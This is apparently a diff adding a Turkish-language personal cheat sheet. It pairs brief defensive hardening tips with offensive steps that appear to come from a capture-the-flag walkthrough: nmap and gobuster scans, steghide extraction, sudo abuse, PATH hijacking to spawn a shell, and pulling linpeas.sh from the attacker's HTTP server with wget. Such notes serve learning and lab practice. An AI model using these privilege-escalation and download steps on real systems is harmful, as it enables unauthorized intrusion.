@@ -1,0 +1,50 @@
+************************************************************
+                    By DEFANSİVE SECURİTY
+************************************************************
+sudo netstat -plnt --> portları kapat
+sudo gufw          --> firewall indir
+                   --> yerli antivirüs
+                   --> yerli sistem pardus
+                   --> gereksiz gördüğün tüm uygulamaları ve servisleri sil
+                   --> şifreli disk
+                   --> uzun parolalar
+                   --> 
+
+************************************************************
+                    By OFENSİVE SECURİTY
+************************************************************
+* system port servis versiyon taraması
+nmap -sV -A -T5 -p- -Pn 192.168.1.36 > /home/kali/Masaüstü/winwin.txt
+********************
+* site dizin tespiti
+gobuster dir -u http://10.3131.31.3.123/ -w /usr/share/wordlist/dirb/common.txt -x html,txt -t 50
+********************
+* resim dosyaları analizi
+binwalk resim.jpg
+steghide extract -sf resim.jpg
+********************
+* ssh alice@10.10.44.245
+yes
+parola
+********************
+* kullanıcı değiştirme
+sudo -l
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+whoami
+********************
+* file dosya
+echo $PATH
+nano date
+#!/bin/bash
+/bin/bash
+********************
+* chmod +x date
+export PATH=/home/rabbit:$PATH
+********************
+* DOSYA AKTARMA İŞLEMLERİ
+-----------------------------------
+python -m SimpleHTTPServer
+wget http://ipadresim:port/linpeas.sh 
+********************
+* d rwx xr x
+user grup herkes
